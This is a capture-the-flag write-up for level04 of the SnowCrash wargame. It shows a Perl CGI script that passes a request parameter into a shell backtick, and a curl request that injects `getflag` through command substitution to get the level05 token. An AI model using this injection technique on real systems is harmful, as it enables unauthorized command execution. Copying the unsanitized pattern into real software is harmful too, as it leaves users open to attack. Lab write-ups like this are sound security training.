# level04

Using ls we can directly see there is a perl script.

```bash
level04@SnowCrash:~$ ls
level04.pl
```

Let's take a look at the code.

```perl
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Ok, we can see a potential exploit on the echo line. Argument $y is passed from $_[0] (First x argument).

Let's try to exploit it. We will decorate command with ``` because we want to script to evaluate our command.

```bash
level04@SnowCrash:~$ curl "http://localhost:4747/level04.pl?x=\`getflag\`"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

Perfect ! Let's go to level05.

```bash
level04@SnowCrash:~$ su level05
Password: ne2searoevaevoem4ov4ar8ap
level05@SnowCrash:~$ 
```
